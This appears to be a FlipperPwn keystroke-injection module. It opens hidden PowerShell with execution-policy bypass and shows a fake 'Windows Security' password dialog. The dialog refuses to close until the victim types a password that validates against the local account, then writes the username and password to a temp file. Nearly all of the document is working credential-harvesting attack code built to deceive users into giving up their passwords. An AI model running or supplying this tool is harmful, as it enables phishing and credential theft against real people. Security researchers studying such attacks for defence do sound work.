# FlipperPwn Module: Fake Windows Login Dialog (Credz-Plz technique)
# Spawns a Windows Forms credential dialog styled to match the native
# "Windows Security" prompt. Validates the entered credentials against the
# local SAM / Active Directory using DirectoryServices.AccountManagement.
# The dialog loops until a correct password is entered — invalid attempts
# are silently discarded (prevents the user from just clicking OK with a blank).
# Captured credentials are written to $env:TEMP\creds.txt.
#
# Reference technique: Credz-Plz / PowerShell credential harvesting via WinForms
# Requires: No admin, no UAC. Works on Windows 7+.

NAME fake_login
DESCRIPTION Spawn a native-looking Windows Security credential dialog and capture entered passwords
CATEGORY credential
PLATFORMS WIN

# No options required

PLATFORM WIN
  # Open hidden PowerShell via Run dialog
  DELAY 500
  GUI r
  DELAY 300
  STRING powershell -w h -nop -ep bypass
  ENTER
  DELAY 1000
  # Load WinForms and DirectoryServices assemblies inline.
  # The script builds the dialog, loops on invalid creds, and writes the result.
  # Split across multiple STRING lines — each line is typed then executed with ENTER.
  STRING Add-Type -AssemblyName System.Windows.Forms,System.Drawing,System.DirectoryServices.AccountManagement
  ENTER
  DELAY 200
  STRING $user=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[-1]; $dom=(Get-WmiObject Win32_ComputerSystem).Domain; $ct=[System.DirectoryServices.AccountManagement.ContextType]::Machine
  ENTER
  DELAY 200
  STRING function Show-FakeLogin { $f=New-Object Windows.Forms.Form; $f.Text="Windows Security"; $f.Size=New-Object Drawing.Size(420,280); $f.StartPosition="CenterScreen"; $f.FormBorderStyle="FixedDialog"; $f.MaximizeBox=$false; $f.MinimizeBox=$false; $f.TopMost=$true; $icon=[Drawing.SystemIcons]::Shield; $pb=New-Object Windows.Forms.PictureBox; $pb.Image=$icon.ToBitmap(); $pb.Size=New-Object Drawing.Size(32,32); $pb.Location=New-Object Drawing.Point(20,20); $f.Controls.Add($pb); $lbl=New-Object Windows.Forms.Label; $lbl.Text="Windows needs your current credentials. Please enter your password."; $lbl.Location=New-Object Drawing.Point(65,20); $lbl.Size=New-Object Drawing.Size(330,40); $f.Controls.Add($lbl); $lu=New-Object Windows.Forms.Label; $lu.Text="Username:"; $lu.Location=New-Object Drawing.Point(20,80); $lu.AutoSize=$true; $f.Controls.Add($lu); $tu=New-Object Windows.Forms.TextBox; $tu.Location=New-Object Drawing.Point(120,77); $tu.Size=New-Object Drawing.Size(260,20); $tu.Text=$user; $tu.ReadOnly=$true; $f.Controls.Add($tu); $lp=New-Object Windows.Forms.Label; $lp.Text="Password:"; $lp.Location=New-Object Drawing.Point(20,120); $lp.AutoSize=$true; $f.Controls.Add($lp); $tp=New-Object Windows.Forms.TextBox; $tp.Location=New-Object Drawing.Point(120,117); $tp.Size=New-Object Drawing.Size(260,20); $tp.UseSystemPasswordChar=$true; $f.Controls.Add($tp); $btn=New-Object Windows.Forms.Button; $btn.Text="OK"; $btn.Location=New-Object Drawing.Point(240,200); $btn.DialogResult="OK"; $f.AcceptButton=$btn; $f.Controls.Add($btn); $bc=New-Object Windows.Forms.Button; $bc.Text="Cancel"; $bc.Location=New-Object Drawing.Point(325,200); $bc.DialogResult="Cancel"; $f.Controls.Add($bc); $f.ShowDialog(); return $tp.Text }
  ENTER
  DELAY 200
  STRING $pw=""; $valid=$false; while(-not $valid){ $pw=Show-FakeLogin; try{ $pc=New-Object System.DirectoryServices.AccountManagement.PrincipalContext($ct); $valid=$pc.ValidateCredentials($user,$pw) }catch{ $valid=$false } }; "$user`:$pw" | Out-File "$env:TEMP\creds.txt"; [Windows.Forms.MessageBox]::Show("Your credentials have been verified.","Windows Security") | Out-Null
  ENTER
